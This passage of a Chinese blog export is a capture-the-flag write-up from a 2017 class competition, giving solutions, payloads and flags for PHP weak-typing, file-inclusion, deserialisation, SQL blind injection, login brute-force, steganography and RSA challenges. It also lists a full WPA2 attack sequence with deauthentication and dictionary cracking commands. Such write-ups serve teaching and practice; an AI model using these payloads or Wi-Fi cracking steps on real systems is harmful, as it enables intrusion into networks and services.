            <tag> Flag </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[2017班级对抗赛WP&心得]]></title>
      <url>/2017/12/01/2017%E7%8F%AD%E7%BA%A7%E5%AF%B9%E6%8A%97%E8%B5%9BWP+%E5%BF%83%E5%BE%97/</url>
      <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>    Geek 之后又来了一波班级对抗赛，成绩不是最重要的，主要是想见见世面，涨涨见识。知己知彼，百战不殆嘛！<a id="more"></a></excerpt></p>
<the rest="" of="" contents="" |="" 余下全文="">

<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="简单代码审计（送分）by-Ph0rse"><a href="#简单代码审计（送分）by-Ph0rse" class="headerlink" title="简单代码审计（送分）by  Ph0rse"></a>简单代码审计（送分）by  Ph0rse</h2><h3 id="题目地址"><a href="#题目地址" class="headerlink" title="题目地址"></a>题目地址</h3><p><a href="http://45.32.90.22:2501/index.php" target="_blank" rel="noopener">http://45.32.90.22:2501/index.php</a></p>
<h3 id="题目类型"><a href="#题目类型" class="headerlink" title="题目类型"></a>题目类型</h3><p>代码审计，PHP弱类型</p>
<h3 id="考察知识点"><a href="#考察知识点" class="headerlink" title="考察知识点"></a>考察知识点</h3><p>1、Base64解密<br>2、变量覆盖<br>3、md5弱类型相等<br>4、md5数组加密漏洞</p>
<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p><a href="http://45.32.90.22:2501/index.php?name=xiaohong&amp;sex=nv&amp;key=240610708&amp;pen[]=1&amp;apple[]=2" target="_blank" rel="noopener">http://45.32.90.22:2501/index.php?name=xiaohong&amp;sex=nv&amp;key=240610708&amp;pen[]=1&amp;apple[]=2</a></p>
<h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><p>D0G3{BAC0N_IS_TASTY!}</p>
<p>Writeup：</p>
<p>送分代码审计 看源码啥也没有，考虑源码泄露。而且源码里面base64也提示了<img src="https://ws4.sinaimg.cn/large/006tKfTcly1fm1gs4a6g0j30km0f4wfj.jpg" alt=""> </p>
<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fm1gtzr8ctj30pu0zk4dy.jpg" alt=""></p>
<p>这里给一个学习php弱类型的网站：<a href="https://www.cnblogs.com/Mrsm1th/p/6745532.html" target="_blank" rel="noopener">https://www.cnblogs.com/Mrsm1th/p/6745532.html</a></p>
<h5 id="划重点："><a href="#划重点：" class="headerlink" title="划重点："></a>划重点：</h5><p>源码泄露</p>
<h2 id="Myblog-Typecho——EXP-by-Ph0rse"><a href="#Myblog-Typecho——EXP-by-Ph0rse" class="headerlink" title="Myblog  Typecho——EXP   by   Ph0rse"></a>Myblog  Typecho——EXP   by   Ph0rse</h2><h3 id="环境地址"><a href="#环境地址" class="headerlink" title="环境地址"></a>环境地址</h3><p><a href="http://45.32.90.22:2502/" target="_blank" rel="noopener">http://45.32.90.22:2502/</a><br>数据库密码为空，但限制了只有本地IP可以访问<br>后台管理员账号密码为D0g233333</p>
<h3 id="考察知识点-1"><a href="#考察知识点-1" class="headerlink" title="考察知识点"></a>考察知识点</h3><p>快速锁定版本号，搜索exp，getshell<br>反序列化<br>快速代码审计</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p><a href="http://ph0rse.me/2017/10/30/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BTypecho%E4%BA%8C%E8%BF%9E%E7%88%86/3" target="_blank" rel="noopener">http://ph0rse.me/2017/10/30/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BTypecho%E4%BA%8C%E8%BF%9E%E7%88%86/3</a></p>
<h3 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag"></a>Flag</h3><p>D0g3{th1s_here_hihihi}</p>
<h5 id="Question"><a href="#Question" class="headerlink" title="Question:"></a>Question:</h5><p>1.</p>
<h2 id="secret-code-by-Sn00py"><a href="#secret-code-by-Sn00py" class="headerlink" title="secret code  by  Sn00py"></a>secret code  by  Sn00py</h2><h3 id="考察知识点-2"><a href="#考察知识点-2" class="headerlink" title="考察知识点"></a>考察知识点</h3><p>1.php源码加密</p>
<h3 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload"></a>Payload</h3><p><a href="http://222.18.158.244:4141/" target="_blank" rel="noopener">http://222.18.158.244:4141/</a> post:debug=1&amp;file=flag.php<br>burpsuite下拷贝加密源码到flag.php,包含flag.php,输出全局变量.</p>
<h3 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag"></a>Flag</h3><p>D0g3{hava_fun!!!!!!}</p>
<h5 id="Question-1"><a href="#Question-1" class="headerlink" title="Question:"></a>Question:</h5><p>1.</p>
<h2 id="血红的双眼-by-C1em0"><a href="#血红的双眼-by-C1em0" class="headerlink" title="血红的双眼 by C1em0"></a>血红的双眼 by C1em0</h2><h3 id="题目名"><a href="#题目名" class="headerlink" title="题目名"></a>题目名</h3><p>《血红的双眼》 by C1em0</p>
<h3 id="考察内容"><a href="#考察内容" class="headerlink" title="考察内容"></a>考察内容</h3><p>sql布尔盲注，过滤绕过，python脚本编写，bp使用。</p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h3><p>根据测出的过滤处进行编写脚本或者用bp跑就行，python脚本注意编码问题。</p>
<h5 id="Question-2"><a href="#Question-2" class="headerlink" title="Question:"></a>Question:</h5><p>1.</p>
<h2 id="WEB-64号基地-by-zev3n"><a href="#WEB-64号基地-by-zev3n" class="headerlink" title="WEB-64号基地  by zev3n"></a>WEB-64号基地  by zev3n</h2><h3 id="题目地址-1"><a href="#题目地址-1" class="headerlink" title="题目地址"></a>题目地址</h3><p>还没传到服务器。。。</p>
<h3 id="题目类型-1"><a href="#题目类型-1" class="headerlink" title="题目类型"></a>题目类型</h3><p>文件包含导致的任意文件读取</p>
<h3 id="考察知识点-3"><a href="#考察知识点-3" class="headerlink" title="考察知识点"></a>考察知识点</h3><p>1.php伪协议<br>2.伪协议中filter过滤器的常见种类</p>
<h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>1.点开页面中的链接，得到file参数的提示，应该想到文件包含<br>2.尝试用php://filter/read=<strong>convert.base64-encode</strong>/resourse=index.php读取出本页面的源码<br>3.读出“源码”的base64，解密后发现没有想象中那么简单<br>4.使用<strong>string.rot13</strong>过滤器重新读取，解密后得到flag</p>
<h2 id="What-remains-of-Bruce-Finch-by-Skye"><a href="#What-remains-of-Bruce-Finch-by-Skye" class="headerlink" title="What remains of Bruce Finch  by Skye"></a>What remains of Bruce Finch  by Skye</h2><h3 id="链接：http-222-18-158-244-4151"><a href="#链接：http-222-18-158-244-4151" class="headerlink" title="链接：http://222.18.158.244:4151/"></a>链接：<a href="http://222.18.158.244:4151/" target="_blank" rel="noopener">http://222.18.158.244:4151/</a></h3><h3 id="考察：暴力破解，两次加密处理，firebug使用（删除节点）"><a href="#考察：暴力破解，两次加密处理，firebug使用（删除节点）" class="headerlink" title="考察：暴力破解，两次加密处理，firebug使用（删除节点）"></a>考察：暴力破解，两次加密处理，firebug使用（删除节点）</h3><h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p>firebug中删除节点，将干扰字幕除去，进入表单，用burpsuite对用户名和密码进行爆破，用户名根据提示中的四个名字。用户名是Edith，密码123321，用burp的时候又MD5和base64加密。<br>flag：Dog3{Brut3_f0rc3_50_e45y}</p>
<h5 id="Question-3"><a href="#Question-3" class="headerlink" title="Question:"></a>Question:</h5><p>1.</p>
<h2 id="计算题-by-We2sWing"><a href="#计算题-by-We2sWing" class="headerlink" title="计算题 by We2sWing"></a>计算题 by We2sWing</h2><p>浏览器F12看源码 改长度  得到base64加密和url加密的字符串  解密一次即可</p>
<p>By myself:</p>
<p>改长度+base64解密</p>
<p><img src="file:////Users/akk/Library/Group%20Containers/UBF8T346G9.Office/msoclip1/01/clip_image002.png" alt="img"></p>
<p>flag{D0g3_happy~}</p>
<h2 id="加0题-by-We2sWing"><a href="#加0题-by-We2sWing" class="headerlink" title="加0题 by We2sWing"></a>加0题 by We2sWing</h2><p>robot.txt 直接在网页后面加一个robot.txt 进去就能看源码 在根据源码 去url编码字符串</p>
<p>writeup：</p>
<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fm1guxx7wpj30cs05y74n.jpg" alt=""></p>
<p>页面给出robo.txt提示 访问</p>
<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fm1gvbag93j30j80r80xs.jpg" alt=""></p>
<p>url编码，传输过去后会被默认解码一次，所以将jia0编码两次，再传入就可以得到flag</p>
<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fm1gvouzpdj30ny0c4mzc.jpg" alt=""></p>
<h2 id="Love-China-by-汪子豪"><a href="#Love-China-by-汪子豪" class="headerlink" title="Love China  by 汪子豪"></a>Love China  by 汪子豪</h2><p>JavaScript操作题 在浏览器控制台让clicks大于1000000就行（也可以使用POST提交） </p>
<p>By myself：</p>
<p>肯定不可能真的点100w次，所以。。</p>
<p>查看源码：</p>
<p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fm1gwl78c8j30m8046wfg.jpg" alt=""></p>
<p>发现点击次数会post到后台，所以只要在hackbar上面改改数据，就可以拿到flag </p>
<p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fm1gwxewwhj30p60h0gne.jpg" alt=""></p>
<h2 id="php反序列化-by-汪子豪"><a href="#php反序列化-by-汪子豪" class="headerlink" title="php反序列化 by 汪子豪"></a>php反序列化 by 汪子豪</h2><p>PHP反序列化，给提示:hint<br>登录没反应，提示:GET一个hint就有源代码<br> 审计代码，要传一个cookie名为D0g3的反序列值。并且反序列后的值要全等于$KEY<br>注意这里穿进去的是空，即<br>payload<br>Cookie: s:0:””;</p>
<h5 id="Question-4"><a href="#Question-4" class="headerlink" title="Question:"></a>Question:</h5><p>1.</p>
<h2 id="web1-by-drac0nids"><a href="#web1-by-drac0nids" class="headerlink" title="web1: by drac0nids"></a>web1: by drac0nids</h2><p>直接post一个超全局变量GLOBALS</p>
<p>Writeup：</p>
<p>进去直接源码出来， </p>
<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fm1gxua1utj30k40a60ut.jpg" alt=""></p>
<p>看到最后一行，eval(“var_dump($$args)”)   可变变量，传一个全局数组变量。args=GLOBALS</p>
<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fm1gy3lkpaj30ps08otck.jpg" alt=""></p>
<h5 id="Question-5"><a href="#Question-5" class="headerlink" title="Question:"></a>Question:</h5><p>1.</p>
<h2 id="web2-by-drac0nids"><a href="#web2-by-drac0nids" class="headerlink" title="web2: by drac0nids"></a>web2: by drac0nids</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span>    <span class="string">"&lt;!--index.phps--&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hahahaha"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'23333'</span>;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">if</span>($data==<span class="string">"I want to join D0g3"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> strlen($b&lt;<span class="number">7</span>) <span class="keyword">and</span> eregi($b,<span class="string">"1114"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"work harder!harder!harder!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>一道代码审计题<br>梳理一下得到flag的条件：<br>第一个if出id不能等于0，若id等于0，那么!$_GET[‘id’]==1，就会进入if语句内部，然后会跳转但后面有要求id==0,当传入id等于一个英文字母时，由于php的弱类型，会将字母转化为0在进行比较，因此，我们可以使id=a来绕过</p>
<p>由后面a在file_get_contents中可以知道，a应该传入一个文件名，data读取a文件的内容后为”I want to join D0g3”,此处利用file_get_contents的特性，当用到php://input的时候，file_get_contents支持字节流输入，因此将a设为php://input,然后post我们想要输入a中的内容就可以了</p>
<p>使用eregi进行正则匹配时，只要第一个参数是第二个参数的子串就会匹配成功，返回true，在php中%00会对eregi()函数进行截断，但不会对strlen()函数进行截断，而且b的长度我做了限制只能为6位，因此，我们使用%00来构造截断绕过限制b=1%0012345，strlen不会ba%00算在字符长度里面   </p>
<p>Writeup：</p>
<p>这里看到源码，strlen可以通过%00来截断绕过，id==0 随便测试传个值，b需要绕过eregi 用00截 断 data通过使用伪协议绕过stripos</p>
<p>payload:</p>
<p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fm1gyvyl5wj30pq0qqn1x.jpg" alt=""></p>
<h2 id="绝对找不到的D0g3-by-TimeS0ng"><a href="#绝对找不到的D0g3-by-TimeS0ng" class="headerlink" title="绝对找不到的D0g3 by TimeS0ng"></a>绝对找不到的D0g3 by TimeS0ng</h2><p>Wireshark抓包分析，ftp基于明文传输账号密码<br>payload:利用Wireshark过滤ftp数据包</p>
<p>By OldTang：</p>
<p>Wireshark打开查找D0g3</p>
<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fm1gzkgqshj30bk09e3zy.jpg" alt=""></p>
<h2 id="还能找到算我输-by-TimeS0ng"><a href="#还能找到算我输-by-TimeS0ng" class="headerlink" title="还能找到算我输   by TimeS0ng"></a>还能找到算我输   by TimeS0ng</h2><p>考察内容：aircrack-ng破解WPA2握手包密码，airdecap-ng还原802.11数据包<br>Tips1:数据包里有握手包  Tips2:flag以D0g3{IP_xxxx}形式提交我的内网IP</p>
<blockquote>
<p>aircrack-ng -w common.txt wpa2-01.cap<br>airdecap-ng D0g3-1.cap -e TimeS0ng -p password -b E4:F3:F5:2D:55:A8<br>airmon-ng start wlan0;iwconfig</p>
</blockquote>
<p>airodump-ng wlan0mon</p>
<p>airodump-ng wlan0mon -c 1 –essid TimeS0ng -w wpa2</p>
<p>aireplay-ng wlan0mon -0 3 -a E4:F3:F5:2D:55:A8  -c 98:01:a7:c5:f7:6d</p>
<p>aircrack-ng -w common.txt wpa2-01.cap</p>
<p>airdecap-ng wpa2-01.cap -e TimeS0ng -p password -b E4:F3:F5:2D:55:A8</p>
<h2 id="Amazing-magic-by-w1mps"><a href="#Amazing-magic-by-w1mps" class="headerlink" title="Amazing magic    by w1mps"></a>Amazing magic    by w1mps</h2><p>提示post个key，源码里提示post个source过来，然后给出了源码，审一下，ban了1到9，但是0可以用，利用0x绕过就可以了<br>payload: key=0xdec0de</p>
<p>Flag:D0g3{mmmmmagic!?!}</p>
<p>writeup：</p>
<p>post随便传个值后在页源码中发现一句提示</p>
<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fm1h0fe9ofj30qa07sq4f.jpg" alt=""></p>
<p>接着post key=source</p>
<p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fm1h0s0yw9j30oe09wn0v.jpg" alt=""></p>
<p>得到源码，源码要让number==14598366 但是字符并不能相同，所以这里想到通过转换进制 使用 两个进制进行比较  把14598366转换为16进制得到0xdec0de</p>
<p>所以key=0xdec0de</p>
<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fm1h0yf7wej30ns0hkgp4.jpg" alt=""></p>
<p>#####这道题难道是我在整理writeup的时候出的？我怎么一点印象都没有！！</p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="热身upup"><a href="#热身upup" class="headerlink" title="热身upup"></a>热身upup</h2><h3 id="考察知识点-4"><a href="#考察知识点-4" class="headerlink" title="考察知识点"></a>考察知识点</h3><p>摩斯电码，听得出来可以直接翻译，但是乐感较差的可以用音频编辑软件打开，例如AU，即可看到明显的分段</p>
<h3 id="Flag-3"><a href="#Flag-3" class="headerlink" title="Flag"></a>Flag</h3><p>D0g3{UUUTUTUUT}</p>
<h5 id="划重点：-1"><a href="#划重点：-1" class="headerlink" title="划重点："></a>划重点：</h5><p>一开始听到这个音频，简直懵逼，就各种试验，丢到au里，感觉不对劲，就各种百度google找到了摩斯电码这个神奇的东西。</p>
<h2 id="芬奇的日记"><a href="#芬奇的日记" class="headerlink" title="芬奇的日记"></a>芬奇的日记</h2><h3 id="链接-https-pan-baidu-com-s-1eSJAWWM-密码-ju3h"><a href="#链接-https-pan-baidu-com-s-1eSJAWWM-密码-ju3h" class="headerlink" title="链接: https://pan.baidu.com/s/1eSJAWWM 密码: ju3h"></a>链接: <a href="https://pan.baidu.com/s/1eSJAWWM" target="_blank" rel="noopener">https://pan.baidu.com/s/1eSJAWWM</a> 密码: ju3h</h3><h3 id="考察：图种，二维码反色，base64解密解法"><a href="#考察：图种，二维码反色，base64解密解法" class="headerlink" title="考察：图种，二维码反色，base64解密解法"></a>考察：图种，二维码反色，base64解密<strong>解法</strong></h3><p>丢在binwalk中跑，发现图中还有另一个图，分离出来，二维码反色，扫了之后得到字符串，base64解密</p>
<p>flag：<code>D0g3{Y0u _4re_c0Oi!}</code></p>
<p>writeup：</p>
<p>芬奇的日记 下载下来是一张png图片，先放到kali看看能不能分离</p>
<p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fm1h1h4eabj30n004gade.jpg" alt=""></p>
<p>发现有两张png图片，那么就dd分离 </p>
<p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fm1h23dgouj30n202omzp.jpg" alt=""></p>
<p>得到了一张二维码的图片  </p>
<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fm1h2gn3qpj30ca0cgk0l.jpg" alt=""></p>
<p>用stegsolve打开调制Gray bits得到二维码</p>
<p>然后扫描得到下面的一串编码</p>
<p>Base64解一下得flag</p>
<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fm1h42cuf5j30g20iidi0.jpg" alt=""></p>
<p>#####划重点：</p>
<p>论linux的重要性，在window下用winhex各种工具也看不出猫腻！</p>
<h2 id="来自佛的一封信-by-C1em0"><a href="#来自佛的一封信-by-C1em0" class="headerlink" title="来自佛的一封信  by C1em0"></a>来自佛的一封信  by C1em0</h2><ol>
<li>题目名：《来自佛的一封信》</li>
<li>考察内容：源码查看习惯，百度能力，base64编码</li>
<li>payload:在注释中找到密文，百度题目关键字就能在线解密。</li>
</ol>
<h5 id="划重点：-2"><a href="#划重点：-2" class="headerlink" title="划重点："></a>划重点：</h5><h2 id="留图不留种-by-zev3n"><a href="#留图不留种-by-zev3n" class="headerlink" title="留图不留种  by zev3n"></a>留图不留种  by zev3n</h2><h3 id="题目地址-2"><a href="#题目地址-2" class="headerlink" title="题目地址"></a>题目地址</h3><p><a href="http://pan.baidu.com/s/1pLNv33H" target="_blank" rel="noopener">http://pan.baidu.com/s/1pLNv33H</a></p>
<h3 id="题目类型-2"><a href="#题目类型-2" class="headerlink" title="题目类型"></a>题目类型</h3><p>zip伪加密，图种，二维码</p>
<h3 id="考察知识点-5"><a href="#考察知识点-5" class="headerlink" title="考察知识点"></a>考察知识点</h3><p>1.binwalk或winhex的使用<br>2.图种的解压<br>3.二维码两种定位点的作用<br>4.二维码的纠错功能</p>
<h3 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>1.winhex修改标记破解伪加密或者直接拿进Linux系统解压出图种<br>2.binwalk -e分解或者直接修改文件后缀名得到隐藏压缩包<br>3.得到两张不完整的二维码图片<br>4.观察二维码缺失定位点（以及辅助定位点），再观察图片中心有一个定位点样式区域<br>5.复制中心区域到三个角，再拼接上辅助定位点，扫描得到flag</p>
<h5 id="划重点"><a href="#划重点" class="headerlink" title="划重点:"></a>划重点:</h5><p>观察二维码缺失位点、辅助定位点</p>
<h2 id="RRRSA-by-w1mps"><a href="#RRRSA-by-w1mps" class="headerlink" title="RRRSA  by w1mps"></a>RRRSA  by w1mps</h2><p>rsa.txt<br>n的一个因数比较小，很容易跑出来p和q，求出d就解出来了，为了提示他们暴力跑。。另外一个因数其实也没给很大，不写脚本其实也可以出，比如可以去<a href="http://factordb.com/求解" target="_blank" rel="noopener">http://factordb.com/求解</a> </p>
<p>解密脚本：</p>
<h3 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="coding: utf-8"></a>coding: utf-8</h3><p>  c = [‘231209168460534368’,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&apos;653775369641132514&apos;,</span><br><span class="line">&apos;572992224772813854&apos;,</span><br><span class="line">&apos;24661130601438802&apos;,</span><br><span class="line">&apos;207970797586895508&apos;,</span><br><span class="line">&apos;7420374200071926&apos;,</span><br><span class="line">&apos;220033179808126041&apos;,</span><br><span class="line">&apos;690428728542718718&apos;,</span><br><span class="line">&apos;522803131162521381&apos;,</span><br><span class="line">&apos;108831082199640865&apos;,</span><br><span class="line">&apos;209002588024035867&apos;,</span><br><span class="line">&apos;690428728542718718&apos;,</span><br><span class="line">&apos;86875381817289627&apos;,</span><br><span class="line">&apos;86875381817289627&apos;,</span><br><span class="line">&apos;86875381817289627&apos;,</span><br><span class="line">&apos;576873037271561711&apos;,</span><br><span class="line">&apos;185467894761485820&apos;]</span><br></pre></td></tr></table></figure>
<p>  n = 696074725189933717<br>  e = 65537</p>
<h3 id="n很小，猜解其中一个因数很小"><a href="#n很小，猜解其中一个因数很小" class="headerlink" title="n很小，猜解其中一个因数很小"></a>n很小，猜解其中一个因数很小</h3><p>  def pq():</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for p in xrange(2, 100):</span><br><span class="line">    if (n % p == 0):</span><br><span class="line">        return p</span><br></pre></td></tr></table></figure>
<p>  def fast_mod(b, e, m):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">result = 1</span><br><span class="line">while e != 0:</span><br><span class="line">    if (e&amp;1) == 1:</span><br><span class="line">        # ei = 1, then mul</span><br><span class="line"></span><br><span class="line">        result = (result * b) % m</span><br><span class="line">    e &gt;&gt;= 1</span><br><span class="line">    # b, b^2, b^4, b^8, ... , b^(2^n)</span><br><span class="line">    b = (b*b) % m</span><br><span class="line">return result</span><br></pre></td></tr></table></figure>
<p>  def extendedGCD(a, b):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">if b == 0:</span><br><span class="line">    return (1, 0, a)</span><br><span class="line">x1 = 1</span><br><span class="line">y1 = 0</span><br><span class="line">x2 = 0</span><br><span class="line">y2 = 1</span><br><span class="line">while b != 0:</span><br><span class="line">    q = a / b</span><br><span class="line">    r = a % b</span><br><span class="line">    a = b</span><br><span class="line">    b = r</span><br><span class="line">    x = x1 - q*x2</span><br><span class="line">    x1 = x2</span><br><span class="line">    x2 = x</span><br><span class="line">    y = y1 - q*y2</span><br><span class="line">    y1 = y2</span><br><span class="line">    y2 = y</span><br><span class="line">return(x1, y1, a)</span><br></pre></td></tr></table></figure>
<p>  def computeD(fn, e):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(x, y, r) = extendedGCD(fn, e)</span><br><span class="line">#y maybe &lt; 0, so convert it</span><br><span class="line">if y &lt; 0:</span><br><span class="line">    return fn + y</span><br><span class="line">return y</span><br></pre></td></tr></table></figure>
<p>  if <strong>name</strong> == ‘<strong>main</strong>‘:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">print &apos;n=&apos; + str(n)</span><br><span class="line">print &apos;e=&apos; + str(e)</span><br><span class="line">p = pq()</span><br><span class="line">q = n / pq()</span><br><span class="line">print &apos;p=&apos;+str(p)</span><br><span class="line">print &quot;q=&quot;+str(q)</span><br><span class="line">fn = (q-1)*(p-1)</span><br><span class="line">d = computeD(fn, e)</span><br><span class="line">print &apos;d=&apos; + str(d)</span><br><span class="line">for i in c:</span><br><span class="line">    c = int(i)</span><br><span class="line">    m1=fast_mod(c,d,n)</span><br><span class="line">    print &apos;解密:&apos;+str(m1)+&quot;     %s&quot; % ((&quot;%x&quot; % m1).decode(&quot;hex&quot;))</span><br></pre></td></tr></table></figure>
<p><img src="http://ovc0f0a85.bkt.clouddn.com/01j4epe30xxn79hqs0vujgbwhr.png" alt=""><br><img src="http://ovc0f0a85.bkt.clouddn.com/a211szfgpkyjsmc887nyxldgkq.png" alt=""></p>
<p>writeup：</p>
<p>首先还是要学习一下RSA算法是什么，下面贴一下学习的地方。 <a href="http://bobao.360.cn/learning/detail/3058.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3058.html</a> 在这里主要思路就是先通过n计算出p,q，通过p,q再计算出d，之后就可以求出m。 就在我上面贴的网址里面有可以求出p,q的值的网址。</p>
<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fm1h4zjdm8j30qk0autd1.jpg" alt=""></p>
<p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fm1h5jcdqdj30ps0ton17.jpg" alt=""></p>
<p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fm1h5uvt0ij30k00qsdhe.jpg" alt=""></p>
<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fm1h67v3snj30na13gtjq.jpg" alt=""></p>
<p>这里就贴一部分了，最后解出来，就是这样。</p>
<h2 id="crypt-by-drac0nids"><a href="#crypt-by-drac0nids" class="headerlink" title="crypt  by drac0nids"></a>crypt  by drac0nids</h2><p>第一关给了一串二位数<br>二位数第一位代表手机键盘对应的位置<br>第二位数字代表第几个字母<br>得到密码为zhimakaimen<br>进入第二关<br>哈夫曼树<br>将叶子位置的节点先ascii转字符<br>然后按照哈夫曼编码排出先后顺序</p>
<h5 id="Question-6"><a href="#Question-6" class="headerlink" title="Question:"></a>Question:</h5><p>1.</p>
<p>2.</p>
<p>题目来源：dog3</p>
<p>没有注明的writeup均来自163faker。</p>
<p>谨做个人学习笔记之用，如有侵权请告知！</p>
</the>]]></content>
      
        <categories>
            
            <category> Study </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Summary </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[论Mac备份的重要性<-血的教训]]></title>
      <url>/2017/11/19/%E8%AE%BAMac%E5%A4%87%E4%BB%BD%E7%9A%84%E9%87%8D%E8%A6%81%E6%80%A7%3C-%E8%A1%80%E7%9A%84%E6%95%99%E8%AE%ADmd/</url>
      <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>    总以为不会发生的事情，万一有一天真的降临在你头上了……<a id="more"></a></excerpt></p>
<p><the rest="" of="" contents="" |="" 余下全文=""></the></p>
